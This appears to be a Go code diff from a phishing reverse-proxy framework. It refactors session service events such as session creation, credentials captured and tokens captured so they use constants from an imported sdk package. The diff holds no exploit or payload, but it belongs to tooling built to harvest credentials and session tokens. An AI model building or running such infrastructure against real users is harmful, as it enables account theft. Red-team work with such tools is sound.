@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"github.com/google/uuid"
+	"github.com/travisbale/mirage/sdk"
 )
 
 // sessionStore is the persistence interface required by SessionService.
@@ -216,7 +217,7 @@ func (s *SessionService) Complete(session *Session) error {
 	}
 
 	s.cache.Delete(session.ID)
-	s.Bus.Publish(Event{Type: EventSessionCompleted, Payload: session})
+	s.Bus.Publish(Event{Type: sdk.EventSessionCompleted, Payload: session})
 
 	return nil
 }
@@ -225,7 +226,7 @@ func (s *SessionService) Update(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: EventTokensCaptured, Payload: session})
+	s.Bus.Publish(Event{Type: sdk.EventTokensCaptured, Payload: session})
 	return nil
 }
 
@@ -233,7 +234,7 @@ func (s *SessionService) CaptureCredentials(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: EventCredsCaptured, Payload: session})
+	s.Bus.Publish(Event{Type: sdk.EventCredsCaptured, Payload: session})
 	return nil
 }
 
@@ -274,7 +275,7 @@ func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishl
 	}
 
 	s.cache.Store(sess.ID, sess)
-	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
+	s.Bus.Publish(Event{Type: sdk.EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
 
 	return sess, nil
 }
